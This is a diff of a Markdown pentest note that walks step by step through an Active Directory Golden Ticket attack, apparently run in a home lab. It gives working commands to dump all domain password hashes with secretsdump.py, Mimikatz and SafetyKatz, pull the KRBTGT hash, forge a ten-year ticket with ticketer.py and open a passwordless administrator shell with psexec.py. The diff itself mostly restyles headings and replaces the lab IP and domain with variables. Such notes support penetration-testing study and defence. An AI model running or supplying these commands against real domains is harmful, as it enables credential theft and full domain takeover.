@@ -1,7 +1,9 @@
 #AD_golden_ticket
 
+> [!info] KRBTGT Account
 > KRBTGT is a service account whose hash is used to sign and encrypt Kerberos Ticket Granting Tickets (TGTs).
 
+> [!danger] Golden Ticket
 > A **Golden Ticket** is a fake master key that lets an attacker impersonate ANY user in a Windows domain without needing a password.
 
 - **What it is:**  
@@ -28,27 +30,31 @@
     - Works for **lateral movement** (jump between machines) and **persistence** (keep access even if admins reset passwords)
 
 
-# **Steps 
+# <span style="color:#FF5555">Steps</span>
+
+> [!info] Variables used below
+> - `$DC_IP` – Domain Controller's IP
+> - `$DOMAIN` – target domain name
 
 ___
-# **1. Gather required information**
+# <span style="color:#FF5555">1. Gather required information</span>
 
-# **Get Domain Name**
+# <span style="color:#FF5555">Get Domain Name</span>
 
 ```cmd
 systeminfo
 ```
 ![[Pasted image 20260416093323.png]]
-# **Get Domain SID**
+# <span style="color:#FF5555">Get Domain SID</span>
 
-#### **Method A (from compromised Windows machine):**
+#### <span style="color:#FFB86C">Method A (from compromised Windows machine):</span>
 
 ```bash
-lookupsid.py 'Administrator:P@$$W0rd'@192.168.57.9
+lookupsid.py 'Administrator:P@$$W0rd'@$DC_IP
 ```
 
 ![[Pasted image 20260416093506.png]]
-#### **Method A (from Linux, remote):**
+#### <span style="color:#FFB86C">Method A (from Linux, remote):</span>
 
 or if we've already an access to machine (eg. reverse shell) we can execute `whoami /user` (excluding the last 4 chars, eg. `-500`): `S-1-5-21-1954621190-1971745961-1283776715`
 
@@ -59,21 +65,21 @@ whoami /user
     S-1-5-21-XXXXX-XXXXX-XXXXX-500
 - Remove last part (`-500`) → that’s your **Domain SID**
 ![[Pasted image 20260416093356.png]]
-# **Extract NTLM hash of the KRBTGT account**
+# <span style="color:#FF5555">Extract NTLM hash of the KRBTGT account</span>
 
 We can use Impacket or Mimikatz (or a variant) on the **Domain Controller as Domain Admin**:
 
-### **Using Impacket/secretsdump.py**
+### <span style="color:#50FA7B">Using Impacket/secretsdump.py</span>
 
 ```bash
 # This will Dumps all password hashes from the Domain Controller and we will use the krbtgt account hash
-secretsdump.py 'Administrator:P@$$W0rd'@192.168.57.9 -outputfile krb -user-status
+secretsdump.py 'Administrator:P@$$W0rd'@$DC_IP -outputfile krb -user-status
 ```
 and consider the 4th part of string after the third ':'
 NTLM hash of the KRBTGT account is: `d7ac4db5b820be57cc79f58f196a0e5b`
 ![[Pasted image 20260416094213.png]]
 
-### Using **Mimikatz**
+### <span style="color:#50FA7B">Using Mimikatz</span>
 Download and extract Mimikatz:
 ```powershell
 # Download and extract Mimikatz:
@@ -90,7 +96,7 @@ lsadump::lsa /inject /name:krbtgt
 KRBTGT's NTLM: `d7ac4db5b820be57cc79f58f196a0e5b`
 ![[Pasted image 20260416095758.png]]
 
-### Using SafetyKatz:
+### <span style="color:#50FA7B">Using SafetyKatz</span>
 ```powershell
 C:\Users\Administrator\Documents\Tools\SafetyKatz.exe "lsadump::lsa /patch"
 ```
@@ -98,13 +104,13 @@ C:\Users\Administrator\Documents\Tools\SafetyKatz.exe "lsadump::lsa /patch"
 ![[Pasted image 20260416095826.png]]
 
 ___
-# **2. Forge a Golden Ticket**
+# <span style="color:#FF5555">2. Forge a Golden Ticket</span>
 
-#### **Create the Golden Ticket**
+#### <span style="color:#FFB86C">Create the Golden Ticket</span>
 
 Forge the golden ticket using ticketer.py an impacket's script suite, its duration end after 10 yeas from the moment of creation. The command below contain all requirements needed:
 
-- Domain name -> `dev-angelist.lab`
+- Domain name -> `$DOMAIN`
 - Domain SID -> `S-1-5-21-1954621190-1971745961-1283776715`
 - NTLM hash of the KRBTGT account -> `d7ac4db5b820be57cc79f58f196a0e5b`
 - Username of user that we want to impersonate -> Administrator
@@ -112,12 +118,12 @@ Forge the golden ticket using ticketer.py an impacket's script suite, its durati
 ```bash
 # ticketer.py -nthash <HashValue> -domain-sid <SIDValue> -domain <DomainName> <Username>
 
-ticketer.py -nthash d7ac4db5b820be57cc79f58f196a0e5b -domain-sid S-1-5-21-1954621190-1971745961-1283776715 -domain dev-angelist.lab Administrator
+ticketer.py -nthash d7ac4db5b820be57cc79f58f196a0e5b -domain-sid S-1-5-21-1954621190-1971745961-1283776715 -domain $DOMAIN Administrator
 ```
 
 ![[Pasted image 20260416093755.png]]
 
-### **Convert Ticket Format**
+### <span style="color:#50FA7B">Convert Ticket Format</span>
 
 The ticket is saved in Administrator.ccache, if we need to use specific tools we need to convert it to kirbi format
 
@@ -130,7 +136,7 @@ ticketConverter.py /home/kali/Documents/AD/Administrator.ccache Administrator.ki
 ![[Pasted image 20260416093826.png]]
 
 In this case original .ccache format is compliant with Impacket.
-### **Load Ticket into Memory**
+### <span style="color:#50FA7B">Load Ticket into Memory</span>
 
 Tells your Linux system to use this fake ticket instead of real Kerberos authentication.
 **What this does:** Any Kerberos tool you run now will automatically use the forged Administrator ticket.
@@ -138,7 +144,7 @@ Tells your Linux system to use this fake ticket instead of real Kerberos authent
 export KRB5CCNAME=/home/kali/Documents/AD/Administrator.ccache
 ```
 
-### **Verify Ticket is Loaded**
+### <span style="color:#50FA7B">Verify Ticket is Loaded</span>
 Confirms the fake ticket is loaded and ready to use.
 ```bash
 #If you've not installed krb5 package, install it -> sudo apt install krb5-user 
@@ -147,20 +153,20 @@ klist
 
 ![[Pasted image 20260416094009.png]]
 
-###  **Sync Time with Domain Controller**
+### <span style="color:#50FA7B">Sync Time with Domain Controller</span>
 It Forces your computer's clock to match the Domain Controller's clock.
 ```bash
-cat /etc/hosts | grep dev-angelist.lab 
-sudo ntpdate -u 192.168.57.9 
+cat /etc/hosts | grep $DOMAIN 
+sudo ntpdate -u $DC_IP 
 ```
 
-### **Use the Ticket - Remote Access as Administrator**
+### <span style="color:#50FA7B">Use the Ticket - Remote Access as Administrator</span>
 
 ```bash
 # psexec.py -k -no-pass <DOMAIN_NAME>/<USER_TO_IMPERSONATE>@<DC_HOSTNAME>.<DOMAIN_NAME>
 
 # Login as administrator user without password using the forged kerberose TGT
-psexec.py -k -no-pass dev-angelist.lab/administrator@corp-dc.dev-angelist.lab
+psexec.py -k -no-pass $DOMAIN/administrator@$DC_IP
 ```
 
 ![[Pasted image 20260416094102.png]]
